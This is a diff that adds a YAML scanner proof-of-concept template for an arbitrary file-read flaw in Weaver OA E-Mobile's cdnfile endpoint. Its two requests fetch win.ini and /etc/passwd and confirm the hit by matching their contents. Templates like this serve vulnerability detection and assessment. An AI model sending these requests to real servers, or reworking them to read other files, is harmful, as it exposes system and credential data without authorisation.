@@ -1,0 +1,28 @@
+name: poc-yaml-WeaverOA-E-Mobile-client_cdnfile-File-reading
+transport: http
+
+
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /client/cdnfile/1C/Windows/win.ini?windows
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
+    expression: response.status == 200 && response.body.bcontains(b'; for 16-bit app support')
+
+  r1:
+    request:
+      method: GET
+      path: /client/cdnfile/C/etc/passwd?linux
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
+    expression: response.status == 200 && response.body.bcontains(b'root:')
+expression: r0() || r1()
+
+detail:
+  author: Superhero
+  links:
+    - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247487494&idx=1&sn=464d9a36a7cb01d83d481ec6ec6d27b0&chksm=c267a535f5102c23ea4e678b5f75cfd032e23b066db9dceb9f0190ca0a4a13dcdcc1eaf229fc&token=1439003696&lang=zh_CN#rd
+
